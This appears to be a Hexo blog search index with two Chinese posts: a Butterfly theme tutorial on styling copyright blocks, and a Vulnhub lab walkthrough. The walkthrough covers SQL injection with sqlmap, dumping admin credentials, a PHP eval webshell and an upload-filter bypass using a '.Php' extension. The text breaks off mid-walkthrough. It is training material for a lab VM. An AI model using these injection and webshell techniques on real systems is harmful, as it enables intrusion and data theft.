<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>关于post_copyright版权声明的美化</title>
      <link href="/posts/5764.html"/>
      <url>/posts/5764.html</url>
      
        <content type="html"><![CDATA[<p>效果预览：</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/35065212/1739410992243-d784e4f2-0503-49b1-ba11-39a30bfa62d7.png"></p><ol><li>替换掉<code>[BlogRoot]\themes\butterfly\layout\includes\post\post-copyright.pug</code>中的所有代码，全部替换为以下代码:</li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">if theme<span class="selector-class">.post_copyright</span><span class="selector-class">.enable</span> &amp;&amp; <span class="attribute">page</span><span class="selector-class">.copyright</span> !== false</span><br><span class="line">  - let author = <span class="attribute">page</span><span class="selector-class">.copyright_author</span> ? <span class="attribute">page</span><span class="selector-class">.copyright_author</span> : config.author</span><br><span class="line">  - let url = page.copyright_url ? page.copyright_url : page.permalink</span><br><span class="line">  - let license = page.license ? page.license : theme.post_copyright.license</span><br><span class="line">  - let license_url = page.license_url ? page.license_url : theme.post_copyright.license_url</span><br><span class="line">  .post-copyright</span><br><span class="line">    .post-copyright__title</span><br><span class="line">      span.post-copyright-info</span><br><span class="line">        h #[=page.title]</span><br><span class="line">    .post-copyright__type</span><br><span class="line">      span.post-copyright-info</span><br><span class="line">        <span class="built_in">a</span>(href=<span class="built_in">url_for</span>(url))= theme.post_copyright.decode ? <span class="built_in">decodeURI</span>(url) : url</span><br><span class="line">    .post-copyright-m</span><br><span class="line">      .post-copyright-m-info</span><br><span class="line">        .post-copyright-a</span><br><span class="line">            h 作者</span><br><span class="line">            .post-copyright-cc-info</span><br><span class="line">                h=author</span><br><span class="line">        .post-copyright-c</span><br><span class="line">            h 发布于</span><br><span class="line">            .post-copyright-cc-info</span><br><span class="line">                h=<span class="built_in">date</span>(page.date, config.date_format)</span><br><span class="line">        .post-copyright-u</span><br><span class="line">            h 更新于</span><br><span class="line">            .post-copyright-cc-info</span><br><span class="line">                h=<span class="built_in">date</span>(page.updated, config.date_format)</span><br><span class="line">        .post-copyright-c</span><br><span class="line">            h 许可协议</span><br><span class="line">            .post-copyright-cc-info</span><br><span class="line">                a.<span class="built_in">icon</span>(rel=<span class="string">&#x27;noopener&#x27;</span> target=<span class="string">&#x27;_blank&#x27;</span> title=<span class="string">&#x27;Creative Commons&#x27;</span> href=<span class="string">&#x27;https://creativecommons.org/&#x27;</span>)</span><br><span class="line">                  i.fab.fa-creative-commons</span><br><span class="line">                <span class="built_in">a</span>(rel=<span class="string">&#x27;noopener&#x27;</span> target=<span class="string">&#x27;_blank&#x27;</span> title=license href=<span class="built_in">url_for</span>(license_url))=license</span><br></pre></td></tr></table></figure><ol start="2"><li>替换<code>[BlogRoot]\themes\butterfly\source\css\_layout\post.styl</code>中的部分代码，即<code>.post-copyright</code>后面的所有代码替换为下面该段代码：</li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.post-copyright</span></span><br><span class="line">    <span class="attribute">position</span>: relative</span><br><span class="line">    margin: <span class="number">40px</span> <span class="number">0</span> <span class="number">10px</span></span><br><span class="line">    padding: <span class="number">10px</span> <span class="number">16px</span></span><br><span class="line">    border: <span class="number">1px</span> solid <span class="built_in">var</span>(--light-grey)</span><br><span class="line">    transition: box-shadow .<span class="number">3s</span> ease-in-out</span><br><span class="line">    overflow: hidden</span><br><span class="line">    border-radius: <span class="number">12px</span><span class="meta">!important</span></span><br><span class="line">    background: <span class="built_in">linear-gradient</span>(<span class="number">45deg</span>, <span class="number">#f6d8f5</span>, <span class="number">#c2f1f0</span>, <span class="number">#f0debf</span>);</span><br><span class="line"></span><br><span class="line">    &amp;<span class="selector-pseudo">:before</span></span><br><span class="line">      <span class="attribute">background</span> <span class="selector-tag">var</span>(<span class="attr">--heo-post-blockquote-bg</span>)</span><br><span class="line">      <span class="attribute">position</span> absolute</span><br><span class="line">      <span class="attribute">right</span> -<span class="number">26px</span></span><br><span class="line">      <span class="attribute">top</span> -<span class="number">120px</span></span><br><span class="line">      <span class="attribute">content</span> &#x27;\f25e&#x27;</span><br><span class="line">      <span class="attribute">font-size</span> <span class="number">200px</span></span><br><span class="line">      <span class="attribute">font-family</span> &#x27;<span class="attribute">Font</span> Awesome <span class="number">5</span> Brands&#x27;</span><br><span class="line">      <span class="attribute">opacity</span> .<span class="number">2</span></span><br><span class="line"></span><br><span class="line">    &amp;<span class="selector-pseudo">:hover</span></span><br><span class="line">      <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">8px</span> <span class="number">0</span> <span class="built_in">rgba</span>(<span class="number">232</span>, <span class="number">237</span>, <span class="number">250</span>, .<span class="number">6</span>), <span class="number">0</span> <span class="number">2px</span> <span class="number">4px</span> <span class="number">0</span> <span class="built_in">rgba</span>(<span class="number">232</span>, <span class="number">237</span>, <span class="number">250</span>, .<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    .post-copyright</span><br><span class="line">      &amp;-meta</span><br><span class="line">        color: $light-blue</span><br><span class="line">        font-weight: bold</span><br><span class="line"></span><br><span class="line">      &amp;-info</span><br><span class="line">        padding-left: <span class="number">6px</span></span><br><span class="line"></span><br><span class="line">        a</span><br><span class="line">          text-decoration: none</span><br><span class="line">          word-break: break-word</span><br><span class="line"></span><br><span class="line">          &amp;:hover</span><br><span class="line">            text-decoration: none</span><br><span class="line"></span><br><span class="line">  .post-copyright-cc-info</span><br><span class="line">    color: $theme-color;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="selector-id">#post-outdate-notice</span></span><br><span class="line">    <span class="attribute">position</span>: relative</span><br><span class="line">    margin: <span class="number">0</span> <span class="number">0</span> <span class="number">20px</span></span><br><span class="line">    padding: .<span class="number">5em</span> <span class="number">1.2em</span></span><br><span class="line">    background-color: $noticeOutdate-bg</span><br><span class="line">    color: $noticeOutdate-color</span><br><span class="line">    <span class="built_in">addBorderRadius</span>(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    .num</span><br><span class="line">      padding: <span class="number">0</span> <span class="number">4px</span></span><br><span class="line"></span><br><span class="line">    if <span class="built_in">hexo-config</span>(<span class="string">&#x27;noticeOutdate.style&#x27;</span>) == <span class="string">&#x27;flat&#x27;</span></span><br><span class="line">      padding: .<span class="number">5em</span> <span class="number">1em</span> .<span class="number">5em</span> <span class="number">2.6em</span></span><br><span class="line">      border-left: <span class="number">5px</span> solid $noticeOutdate-border</span><br><span class="line"></span><br><span class="line">      &amp;:before</span><br><span class="line">        @extend .fontawesomeIcon</span><br><span class="line">        position: absolute</span><br><span class="line">        top: <span class="number">50%</span></span><br><span class="line">        left: .<span class="number">9em</span></span><br><span class="line">        color: $noticeOutdate-border</span><br><span class="line">        content: <span class="string">&#x27;\f071&#x27;</span></span><br><span class="line">        transform: <span class="built_in">translateY</span>(-<span class="number">50%</span>)</span><br><span class="line"></span><br><span class="line">  .ads-wrap</span><br><span class="line">    margin: <span class="number">40px</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">.post-copyright-m-info</span><br><span class="line">  .post-copyright-a,</span><br><span class="line">  .post-copyright-c,</span><br><span class="line">  .post-copyright-u</span><br><span class="line">    display inline-block</span><br><span class="line">    width fit-content</span><br><span class="line">    padding <span class="number">2px</span> <span class="number">5px</span></span><br><span class="line">[data-theme=<span class="string">&quot;dark&quot;</span>]</span><br><span class="line">  #post</span><br><span class="line">    .post-copyright</span><br><span class="line">      background <span class="number">#07080a</span></span><br><span class="line">      text-shadow <span class="number">#bfbeb8</span> <span class="number">0</span> <span class="number">0</span> <span class="number">2px</span></span><br><span class="line">      border <span class="number">1px</span> solid <span class="built_in">rgb</span>(<span class="number">19</span> <span class="number">18</span> <span class="number">18</span> / <span class="number">35%</span>)</span><br><span class="line">      box-shadow <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span> <span class="built_in">var</span>(--theme-color)</span><br><span class="line">      animation flashlight <span class="number">1s</span> linear infinite alternate</span><br><span class="line">  .post-copyright-info</span><br><span class="line">    color <span class="number">#e0e0e4</span></span><br><span class="line"></span><br><span class="line">#post</span><br><span class="line">  .post-copyright__title</span><br><span class="line">    font-size <span class="number">22px</span></span><br><span class="line">  .post-copyright__notice</span><br><span class="line">    font-size <span class="number">15px</span></span><br><span class="line">  .post-copyright</span><br><span class="line">    box-shadow <span class="number">2px</span> <span class="number">2px</span> <span class="number">5px</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 博客美化教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> post_copyright </tag>
            
            <tag> 版权声明 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub靶机实战：from_sqli_to_shell_i386</title>
      <link href="/posts/3f12.html"/>
      <url>/posts/3f12.html</url>
      
        <content type="html"><![CDATA[<h2 id="靶机官网："><a href="#靶机官网：" class="headerlink" title="靶机官网："></a>靶机官网：</h2><p><a href="https://www.vulnhub.com/entry/pentester-lab-from-sql-injection-to-shell,80/" title="https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;pentester-lab-from-sql-injection-to-shell,80&#x2F;">https://www.vulnhub.com/entry/pentester-lab-from-sql-injection-to-shell,80/</a></p><h2 id="靶机镜像ISO下载地址：（转链）"><a href="#靶机镜像ISO下载地址：（转链）" class="headerlink" title="靶机镜像ISO下载地址：（转链）"></a>靶机镜像ISO下载地址：（转链）</h2><p><a href="http://4275.com/anqxun" title="from_sqli_to_shell_i386.iso - 4275.COM">from_sqli_to_shell_i386.iso - 4275.COM</a></p><hr><h2 id="一、启动靶机"><a href="#一、启动靶机" class="headerlink" title="一、启动靶机"></a>一、启动靶机</h2><p><img src="https://i-blog.csdnimg.cn/direct/5a4fd41092d44bbe818c8cdde4365ebb.png"><br><img src="https://i-blog.csdnimg.cn/direct/6cc6781b117d4d0fb19c9b5dcaafe880.png"><br><img src="https://i-blog.csdnimg.cn/direct/e494819a888c4997bb06a236b9141496.png"></p><hr><h2 id="二、查找靶机-IP-地址（2种方法）"><a href="#二、查找靶机-IP-地址（2种方法）" class="headerlink" title="二、查找靶机 IP 地址（2种方法）"></a><strong>二、查找靶机 IP 地址（2种方法）</strong></h2><h3 id="1-使用-netdiscover-命令："><a href="#1-使用-netdiscover-命令：" class="headerlink" title="1.使用 netdiscover 命令："></a><strong>1.使用 netdiscover 命令</strong>：</h3><p>在 Kali 终端中，输入 netdiscover 命令，该命令会自动扫描局域网内的活跃主机，尝试查找靶机的 IP 地址。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover</span><br></pre></td></tr></table></figure><p><img src="https://i-blog.csdnimg.cn/direct/a9d3d3ed58f44b479b0bcf8603aec8f5.png"></p><h3 id="2-使用-arp-scan-命令："><a href="#2-使用-arp-scan-命令：" class="headerlink" title="2.使用 arp - scan 命令："></a><strong>2.使用 arp - scan 命令</strong>：</h3><p>执行 arp - scan - l - D 命令，对同网段下的主机进行扫描。此命令通过发送 ARP 请求并接收响应，来获取局域网内设备的 IP 地址和 MAC 地址信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l -D</span><br></pre></td></tr></table></figure><p><img src="https://i-blog.csdnimg.cn/direct/028deb31268a473e80680f8203de2229.png"></p><hr><h2 id="三、端口扫描与服务探测"><a href="#三、端口扫描与服务探测" class="headerlink" title="三、端口扫描与服务探测"></a>三、端口扫描与服务探测</h2><h3 id="1-全端口扫描："><a href="#1-全端口扫描：" class="headerlink" title="1.全端口扫描："></a><strong>1.全端口扫描</strong>：</h3><p>nmap –min - rate 10000 - p - 192.168.16.132 命令对靶机进行全端口扫描。该命令以较高的扫描速率（每分钟至少 10000 个数据包）探测靶机上开放的所有 TCP 端口。扫描结果显示，靶机开放了 22 端口（SSH 服务）和 80 端口（HTTP 服务）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --min - rate 10000 - p - 192.168.16.132</span><br></pre></td></tr></table></figure><p><img src="https://i-blog.csdnimg.cn/direct/8d63dc54dd6245398acf36e1675623aa.png"></p><h3 id="2-对80端口详细扫描："><a href="#2-对80端口详细扫描：" class="headerlink" title="2.对80端口详细扫描："></a><strong>2.对80端口详细扫描</strong>：</h3><p>针对开放的 80 端口，执行 nmap - sT - sC - sV - O - p80 192.168.16.132 命令。此命令在进行 TCP 连接扫描（-sT）的同时，还会运行一系列默认脚本（-sC）来检测常见的漏洞和服务信息，获取服务版本（-sV）以及尝试识别靶机操作系统（-O）。扫描结果表明，80 端口运行的是 Apache httpd 2.2.16 版本（基于 Debian 系统），操作系统为 Linux，内核版本在 2.6.32 - 2.6.35 之间。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap - sT - sC - sV - O - p80 192.168.16.132</span><br></pre></td></tr></table></figure><p><img src="https://i-blog.csdnimg.cn/direct/9472523c21304c06a2331a2825c95ce3.png"></p><hr><h2 id="四、浏览器访问靶机-IP"><a href="#四、浏览器访问靶机-IP" class="headerlink" title="四、浏览器访问靶机 IP"></a>四、浏览器访问靶机 IP</h2><p>在确定靶机开放 80 端口且运行着 Web 服务后，我们在浏览器中输入靶机 IP 地址 192.168.16.132 进行访问。打开页面后，呈现出一个名为 “My Awesome Photoblog” 的网站，页面展示了一些图片相关的内容，如 “last picture: cthulhu” 等信息，同时右侧有 “Admin” 选项卡。</p><p><img src="https://i-blog.csdnimg.cn/direct/66fa776a96684e1cafe5c5e61384a170.png"></p><hr><h2 id="五、寻找sql注入漏洞（2种方法）"><a href="#五、寻找sql注入漏洞（2种方法）" class="headerlink" title="五、寻找sql注入漏洞（2种方法）"></a>五、寻找sql注入漏洞（2种方法）</h2><h3 id="1-nmap漏洞脚本扫描"><a href="#1-nmap漏洞脚本扫描" class="headerlink" title="1.nmap漏洞脚本扫描"></a>1.nmap漏洞脚本扫描</h3><p>使用 nmap –script &#x3D; vuln - p80 192.168.16.132 命令尝试利用 nmap 的漏洞脚本扫描 80 端口的漏洞。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script = vuln - p80 192.168.16.132 </span><br></pre></td></tr></table></figure><p><img src="https://i-blog.csdnimg.cn/direct/9add5ece33754d769586afe42cf7388b.png"></p><p>发现了了大量的SQL注入点：</p><blockquote><p>| http-sql-injection: <br>|   Possible sqli for queries:<br>|     <a href="http://192.168.16.132/cat.php?id=2%27%20OR%20sqlspider">http://192.168.16.132:80/cat.php?id=2%27%20OR%20sqlspider</a><br>|     <a href="http://192.168.16.132/cat.php?id=1%27%20OR%20sqlspider">http://192.168.16.132:80/cat.php?id=1%27%20OR%20sqlspider</a><br>|     <a href="http://192.168.16.132/cat.php?id=3%27%20OR%20sqlspider">http://192.168.16.132:80/cat.php?id=3%27%20OR%20sqlspider</a></p></blockquote><h3 id="2-从页面url中id参数下手，找sql注入点"><a href="#2-从页面url中id参数下手，找sql注入点" class="headerlink" title="2.从页面url中id参数下手，找sql注入点"></a>2.从页面url中id参数下手，找sql注入点</h3><h4 id="（1）发现登录Admin后台界面与潜在-SQL-注入漏洞"><a href="#（1）发现登录Admin后台界面与潜在-SQL-注入漏洞" class="headerlink" title="（1）发现登录Admin后台界面与潜在 SQL 注入漏洞"></a>（1）发现登录Admin后台界面与潜在 SQL 注入漏洞</h4><p>点击 <strong>“Admin”</strong> 选项卡后，进入到一个后台管理的登录界面。</p><p>为了登录成功，我们需要找到有效的用户名和密码。</p><p><img src="https://i-blog.csdnimg.cn/direct/e87b7ff04abc4b388ca6682b35b7016e.png"></p><p>在对网站进行初步探索时，我们点击了右侧的各个选项卡，并观察每个页面的 URL。</p><p><img src="https://i-blog.csdnimg.cn/direct/8150c267ab1e4e6984287e29c991d99a.png"><br><img src="https://i-blog.csdnimg.cn/direct/efdaf577fae0466885e0c653ea7beb99.png"><br><img src="https://i-blog.csdnimg.cn/direct/def78060ff0341c190a44f86094a8e71.png"></p><p>发现多个页面都是通过 GET 方式将<strong>参数 id</strong> 传递给 <strong>cat.php 文件</strong>来获取不同的内容，例如访问 <strong>192.168.16.132&#x2F;cat.php?id &#x3D; 1</strong>、<strong>192.168.16.132&#x2F;cat.php?id &#x3D; 2</strong> 等不同的 id 值会返回不同的图片信息。这种动态参数传递的方式存在 SQL 注入的可能性，因为攻击者可能通过构造恶意的 id 参数值来篡改数据库查询逻辑。</p><h4 id="（2）确定-SQL-注入点"><a href="#（2）确定-SQL-注入点" class="headerlink" title="（2）确定 SQL 注入点"></a>（2）确定 SQL 注入点</h4><p>为了验证 SQL 注入点的存在，我们使用万能测试语句 “<strong>or 1 &#x3D; 1#</strong>” 进行测试。将其添加到 URL 参数中，即访问 <strong>192.168.16.132&#x2F;cat.php?id &#x3D; 1 or 1 &#x3D; 1#</strong>。</p><p><img src="https://i-blog.csdnimg.cn/direct/713440dcc48f4786b37721db5291443e.png"></p><p>经过测试，页面内容发生改变且符合预期，显示了更多的图片信息，这表明成功找到了 SQL 注入点。</p><hr><h2 id="六、SQL-注入漏洞利用与信息获取"><a href="#六、SQL-注入漏洞利用与信息获取" class="headerlink" title="六、SQL 注入漏洞利用与信息获取"></a>六、SQL 注入漏洞利用与信息获取</h2><h4 id="1-使用-sqlmap-扫描数据库"><a href="#1-使用-sqlmap-扫描数据库" class="headerlink" title="1.使用 sqlmap 扫描数据库"></a>1.使用 sqlmap 扫描数据库</h4><p>确定注入点后，我们借助强大的 sqlmap 工具来进一步探索数据库信息。</p><p>执行下面命令（2选一）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap - u <span class="string">&quot;http://192.168.16.132/cat.php?id = 1&quot;</span> --dbs --batch​</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.16.132:80/cat.php?id=2%27%20OR%20sqlspider&quot;</span> -dbs</span><br></pre></td></tr></table></figure><p>会自动检测并利用注入点，尝试获取数据库列表。</p><p><img src="https://i-blog.csdnimg.cn/direct/5f226a93edea46df82dddcf05fbe9e3b.png"></p><blockquote><p><strong>fetching database names：</strong></p><p><strong>available databases [2]:<br>[*] information_schema<br>[*] photoblog</strong></p></blockquote><p>扫描结果显示靶机存在两个数据库，分别是 information_schema（MySQL 系统数据库，用于存储数据库元数据信息）和 photoblog（该摄影博客网站应用所使用的数据库）。</p><h4 id="2-爆破-photoblog-数据库中的表"><a href="#2-爆破-photoblog-数据库中的表" class="headerlink" title="2.爆破 photoblog 数据库中的表"></a>2.爆破 photoblog 数据库中的表</h4><p>接着，我们对 photoblog 数据库中的表进行爆破。使用 sqlmap - u “<a href="http://192.168.16.132/cat.php?id" title="http:&#x2F;&#x2F;192.168.16.132&#x2F;cat.php?id">http://192.168.16.132/cat.php?id</a> &#x3D; 1” - D photoblog –tables –batch 命令，sqlmap 将尝试获取 photoblog 数据库中的所有表名。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">​sqlmap - u <span class="string">&quot;http://192.168.16.132/cat.php?id = 1&quot;</span> - D photoblog --tables --batch</span><br></pre></td></tr></table></figure><p><img src="https://i-blog.csdnimg.cn/direct/347ac3dc32ba43a6b75de3dd195b0502.png">经过一段时间的扫描，成功获取到三个表名：categories（可能用于存储图片分类信息）、pictures（可能存储图片相关数据）和 users（推测用于存储用户信息）。</p><h4 id="3-获取-users-表的字段名"><a href="#3-获取-users-表的字段名" class="headerlink" title="3.获取 users 表的字段名"></a>3.获取 users 表的字段名</h4><p>进一步深入，我们需要获取 users 表中的字段名。执行 sqlmap - u “<a href="http://192.168.16.132/cat.php?id" title="http:&#x2F;&#x2F;192.168.16.132&#x2F;cat.php?id">http://192.168.16.132/cat.php?id</a> &#x3D; 1” - D photoblog - T users –columns –batch 命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">​sqlmap - u <span class="string">&quot;http://192.168.16.132/cat.php?id = 1&quot;</span> - D photoblog - T <span class="built_in">users</span> --columns --batch</span><br></pre></td></tr></table></figure><p><img src="https://i-blog.csdnimg.cn/direct/164c15a9c6114bf9a6ea8f50f1fc4a82.png"></p><p>sqlmap 成功获取到 users 表中的三个字段：id（数据类型为 mediumint (9)，可能是用户 ID）、login（varchar (50)，推测为用户名）和 password（varchar (50)，显然是用户密码）。</p><h4 id="4-获取-users-表中的用户数据"><a href="#4-获取-users-表中的用户数据" class="headerlink" title="4.获取 users 表中的用户数据"></a>4.获取 users 表中的用户数据</h4><p>最后，我们使用 sqlmap - u “<a href="http://192.168.16.132/cat.php?id" title="http:&#x2F;&#x2F;192.168.16.132&#x2F;cat.php?id">http://192.168.16.132/cat.php?id</a> &#x3D; 1” - D photoblog - T users - C id,login,password –dump –batch 命令来获取 users 表中这些字段的具体文本内容。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">​sqlmap - u <span class="string">&quot;http://192.168.16.132/cat.php?id = 1&quot;</span> - D photoblog - T <span class="built_in">users</span> - C <span class="built_in">id</span>,login,password --dump --batch</span><br></pre></td></tr></table></figure><p><img src="https://i-blog.csdnimg.cn/direct/4cf67927b7a34777872967177f29cc12.png"></p><p>经过爆破，我们成功获取到一条用户记录，其中用户名是 “admin”，密码的 MD5 值为 “8efe310f9ab3efeae8d410a8e0166eb2”。幸运的是，sqlmap 直接为我们解密了密码的 MD5 值，得到密码为 “P4ssw0rd”。</p><h4 id="5-登录后台管理系统"><a href="#5-登录后台管理系统" class="headerlink" title="5.登录后台管理系统"></a>5.登录后台管理系统</h4><p>有了用户名和密码，我们返回登录界面，输入 “admin” 和 “P4ssw0rd” 进行登录。</p><p><img src="https://i-blog.csdnimg.cn/direct/5b096e2df86c42d7aeeedaf12dba7069.png"></p><p><img src="https://i-blog.csdnimg.cn/direct/d88cd24f4ba5401dbf035b88784cefdc.png"></p><p>登录成功后，进入到后台管理页面，页面显示了图片管理相关的功能，包括查看图片、删除图片以及添加新图片等操作。</p><p><img src="https://i-blog.csdnimg.cn/direct/92fdfa7620e14430ae8ca1911eca0d42.png"></p><p>这个表是一个图片表，名称是一个herf，可以直接查看，后面的delete应该也是可以删除这张图片</p><hr><h2 id="七、文件上传漏洞利用与获取-Shell"><a href="#七、文件上传漏洞利用与获取-Shell" class="headerlink" title="七、文件上传漏洞利用与获取 Shell"></a>七、文件上传漏洞利用与获取 Shell</h2><h3 id="1-文件上传功能测试"><a href="#1-文件上传功能测试" class="headerlink" title="1.文件上传功能测试"></a>1.文件上传功能测试</h3><p><img src="https://i-blog.csdnimg.cn/direct/7106535805a641efacef2e4b060c9a15.png"><img src="https://i-blog.csdnimg.cn/direct/77278cb7555b47638cea7ce653c255af.png"></p><p>在后台管理页面中，我们注意到 “Add a new picture” 按钮，点击后发现可以上传文件。这意味着着可能存在通过文件上传功能获取更高权限的途径，例如上传恶意文件（如病毒木马）来控制靶机。</p><h3 id="2-上传-PHP-文件失败"><a href="#2-上传-PHP-文件失败" class="headerlink" title="2.上传 PHP 文件失败"></a>2.上传 PHP 文件失败</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;webshell&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i-blog.csdnimg.cn/direct/351f943a9050477ea6e279afb7170f87.png"></p><p>在 Kali 系统中，我们创建一个包含一句话木马的 PHP 文件（命名为abc.php），尝试通过文件上传功能将其上传到靶机。</p><p><img src="https://i-blog.csdnimg.cn/direct/78d6966bd7c5487cb569102d0727ae0f.png"></p><p>、然而，上传失败！靶机显示 “No PHP!!”，这表明靶机对上传的文件进行了过滤，禁止直接上传 PHP 文件。</p><h3 id="3-绕过文件上传过滤"><a href="#3-绕过文件上传过滤" class="headerlink" title="3.绕过文件上传过滤"></a>3.绕过文件上传过滤</h3><p>经过初步分析，猜测靶机是通过检测文件后缀名来过滤上传文件的，即禁止上传后缀名为**.php** 的文件。为了绕过这个限制，我们将 PHP 文件的后缀名由原来的**.php<strong>修改为</strong>.Php**，然后再次尝试上传。</p><p><img src="https://i-blog.csdnimg.cn/direct/5f776f36ad1e4c87a81632b754c91474.png"><img src="https://i-blog.csdnimg.cn/direct/71cb63f262104c898f45e52de7376a75.png"></p><p>这次上传成功了，这进一步证实了我们的猜测，即靶机的上传检测机制仅针对文件后缀名，而未对文件内容进行检测。</p><h3 id="4-寻找上传文件的存储位置"><a href="#4-寻找上传文件的存储位置" class="headerlink" title="4.寻找上传文件的存储位置"></a>4.寻找上传文件的存储位置</h3><p>虽然上传的文件（伪装成.Php格式）成功上传到了靶机，但由于其实际上是一个 PHP 文件，我们需要找到一种方法使其能够被服务器解析为 PHP 脚本，从而执行我们的木马代码。</p><p>为此，我们使用 dirb 命令扫描网站后台目录，希望找到上传文件的存储位置。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">​dirb http://192.168.16.132</span><br></pre></td></tr></table></figure><p>执行 dirb <a href="http://192.168.16.132/" title="http:&#x2F;&#x2F;192.168.16.132">http://192.168.16.132</a>命令后，我们发现了一个名为 “uploads” 的目录，根据其名称和网站的逻辑，我们推测上传的文件很可能保存在这个目录中</p><p><img src="https://i-blog.csdnimg.cn/direct/397a1168e70941af868eacd6eebb87a7.png"></p><h3 id="5-确认上传文件的访问路径"><a href="#5-确认上传文件的访问路径" class="headerlink" title="5.确认上传文件的访问路径"></a>5.确认上传文件的访问路径</h3><h4 id="（1）查找上传文件的保存目录"><a href="#（1）查找上传文件的保存目录" class="headerlink" title="（1）查找上传文件的保存目录"></a>（1）查找上传文件的保存目录</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">​dirb http://192.168.16.132/admin/uploads - w</span><br></pre></td></tr></table></figure><p>为了验证我们的推测，我们使用 dirb 命令再次查看指定目录，执行 dirb <a href="http://192.168.16.132/admin/uploads" title="http:&#x2F;&#x2F;192.168.16.132&#x2F;admin&#x2F;uploads">http://192.168.16.132/admin/uploads</a> - w 命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 